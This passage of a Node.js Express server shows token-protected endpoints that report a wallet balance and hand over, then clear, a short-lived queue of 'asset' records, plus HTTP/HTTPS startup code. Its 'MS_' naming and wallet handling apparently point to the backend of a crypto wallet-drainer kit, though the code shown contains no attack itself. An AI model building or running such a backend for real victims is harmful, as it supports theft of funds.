    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      get_wallet_balance(data.address || MS_Wallet_Address).then(result => {
        if (result != false) {
          return response.status(200).send(JSON.stringify({ status: 'OK', data: result }));
        } else {
          return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
        }
      }).catch(err => {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
      });
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
  web.post("/api/retrive", (request, response) => {
    try {
      let data = request.body;
      if (!data['access_token'] || data['access_token'] != MS_API_Token) {
        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
      }
      if (!fs.existsSync('API_DATA')) fs.writeFileSync('API_DATA', '[]', 'utf-8');
      let API_Data = JSON.parse(fs.readFileSync('API_DATA', 'utf-8'));
      fs.writeFileSync('API_DATA', '[]', 'utf-8');
      return response.status(200).send(JSON.stringify({ status: 'OK', data: API_Data }));
    } catch(err) {
      console.log(err);
      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
    }
  });
  setInterval(() => {
    try {
      if (!fs.existsSync('API_DATA')) fs.writeFileSync('API_DATA', '[]', 'utf-8');
      let API_Data = JSON.parse(fs.readFileSync('API_DATA', 'utf-8')), new_data = [];
      for (const asset of API_Data) {
        try {
          if (Math.floor(Date.now() / 1000) - asset.ts < 300) {
            new_data.push(asset);
          }
        } catch(err) {
          console.log(err);
        }
      }
      fs.writeFileSync('API_DATA', JSON.stringify(new_data), 'utf-8');
    } catch(err) {
      console.log(err);
    }
  }, 60000);
}

web.use((_, response) => {
  try {
    response.status(403).send('Sorry, this page in unavailable')
  } catch(err) {
    console.log(err);
  }
});

if (fs.existsSync('cert') && fs.existsSync(path.join('cert', 'server.key')) && fs.existsSync(path.join('cert', 'server.crt'))) {
  web.listen(80, () => {});
  https.createServer({
    key: fs.readFileSync(path.join('cert', 'server.key')),
    cert: fs.readFileSync(path.join('cert', 'server.crt'))
  }, web).listen(443);
  console.log('\tSERVER IS ONLINE, LISTENING TO PORT 80 & 443\n');
} else {
  web.listen(80, () => {
    console.log('\tSERVER IS ONLINE, LISTENING TO PORT 80\n');
  });
}